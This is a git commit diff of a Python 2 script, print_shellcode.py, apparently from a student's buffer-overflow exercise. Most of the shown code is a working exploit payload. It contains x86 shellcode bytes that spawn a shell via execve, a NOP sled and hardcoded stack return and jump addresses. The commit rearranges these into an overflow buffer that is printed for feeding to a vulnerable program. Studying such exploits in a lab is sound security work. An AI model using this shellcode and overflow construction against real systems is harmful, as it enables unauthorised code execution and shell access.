bcb178ae2d1b889af3ba11b24a7f7cafa76fe1b1
TonyDao <sangdao2014@csu.fullerton.edu>
2017-06-16 20:12:29 -0700

    shellcode after buffer

--- print_shellcode.py
+++ print_shellcode.py
@@ -6,10 +6,14 @@ payload = '\x31\xc0\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69' \
             '\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
 
 
-jumpAddr = "\x08\xcf\xff\xff"
+jumpAddr = "\x30\xcf\xff\xff"
 
 buff = jumpAddr * 16 + nop * 133 + payload + jumpAddr * 10
 
 returnAddr = "\xb8\xce\xff\xff"
 
-print buff + returnAddr
+# print buff + returnAddr
+# print nop * 260 + returnAddr + nop * 182 + returnAddr
+buff = jumpAddr * 65 + returnAddr + nop * 122 + payload + jumpAddr * 10
+
+print buff
